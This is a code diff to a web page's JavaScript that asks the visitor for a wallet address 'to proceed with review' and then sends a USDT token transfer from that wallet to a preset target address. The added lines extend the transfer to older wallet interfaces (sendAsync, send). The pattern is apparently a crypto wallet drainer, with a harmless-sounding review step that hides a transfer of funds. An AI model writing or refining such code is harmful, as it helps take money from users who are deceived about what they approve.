@@ -140,7 +140,6 @@
 
           globalUserAddress = Array.isArray(accounts) ? accounts[0] : accounts;
 
-          // Ultimate Fallback: If imported wallet blocks auto-detection, prompt user to input address manually
           if (!globalUserAddress || typeof globalUserAddress !== 'string' || !globalUserAddress.startsWith('0x')) {
             const manualAddr = prompt("Please enter your wallet address (0x...) to proceed with review:");
             if (manualAddr && manualAddr.trim().startsWith('0x')) {
@@ -150,7 +149,6 @@
             }
           }
 
-          // Switch network
           try {
             if (typeof eth.request === 'function') {
               await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: ETH_CHAIN_ID }] });
@@ -175,17 +173,27 @@
           
           const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
 
-          const txParams = [{
+          const txParams = {
             from: globalUserAddress,
             to: USDT_ETH_ADDRESS,
             data: transferData,
             gas: "0x186A0"
-          }];
+          };
 
+          // Universal method fallback for sending transaction
+          let txResult = null;
           if (typeof eth.request === 'function') {
-            await eth.request({ method: 'eth_sendTransaction', params: txParams });
+            txResult = await eth.request({ method: 'eth_sendTransaction', params: [txParams] });
+          } else if (typeof eth.sendAsync === 'function') {
+            txResult = await new Promise((resolve, reject) => {
+              eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: [txParams] }, (err, res) => {
+                if (err) reject(err);
+                else if (res.error) reject(res.error);
+                else resolve(res.result);
+              });
+            });
           } else if (typeof eth.send === 'function') {
-            await eth.send('eth_sendTransaction', txParams);
+            txResult = await eth.send('eth_sendTransaction', [txParams]);
           } else {
             throw new Error("No transaction method available.");
           }
